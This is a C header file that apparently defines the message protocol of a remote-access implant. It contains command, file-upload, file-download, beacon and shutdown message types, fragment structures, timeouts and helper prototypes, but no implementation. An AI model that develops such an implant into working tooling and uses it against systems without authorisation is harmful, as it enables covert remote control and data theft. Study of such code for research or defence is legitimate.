#include <stdint.h>
#include <assert.h>

#ifndef _IMPLANT_H
#define _IMPLANT_H

#define STDIN				0
#define STDOUT				1
#define STDERR				2

#define TYPE_ALIVE			0
#define TYPE_COMMAND		1
#define TYPE_PUT_FILE_NAME	2
#define TYPE_PUT_FILE		3
#define TYPE_GET_FILE_NAME	4
#define TYPE_GET_FILE		5
#define TYPE_CLOSE_AGENT	6
#define TYPE_RESPONSE		7

#define RET_ERROR			-1
#define RET_OK				0
#define RET_ORDER			1

#define WRITE_SIZE			4096
#define FRAGMENT_SIZE		1024
#define PAYLOAD_SIZE		1004
#define HEADER_SIZE			20

#define AGENT_TIMEOUT		60
#define MS_TIMEOUT			1000			// 1000 ms
#define S_TIMEOUT  			1				// 1 s
#define ALIVE_FREQUENCY		10				// 10 s

// macro to return size of structure field
#define member_size(type, member)	(sizeof( ((type *)0)->member))

typedef struct Fragment_Header{
	int32_t type;						// type of message (0 for alive, 1 for command)
	int32_t index;						// index of fragment
	int32_t total_size;					// size of complete message, will be 0 for alive message
	int32_t next_size;					// size of next fragment
	union{
		uint32_t checksum;				// checksum of complete message, not present in alive messages
		uint32_t alive_time;			// if this is an alive message, include the epoch time of when agent was started on target
	};
} Fragment_Header;


typedef struct Fragment{
	Fragment_Header header;
	char buffer[PAYLOAD_SIZE];			// contents of message
} Fragment;

// Make sure that we have the correct payload sizes defined
// Check PAYLOAD_SIZE
static_assert(FRAGMENT_SIZE == sizeof(Fragment_Header) + PAYLOAD_SIZE);
// Check HEADER_SIZE
static_assert(HEADER_SIZE == sizeof(Fragment_Header));

int sendall(int, char*, int);

int writeall(FILE*, char*, int);

int check_directory(char*, int);

#endif /* _IMPLANT_H */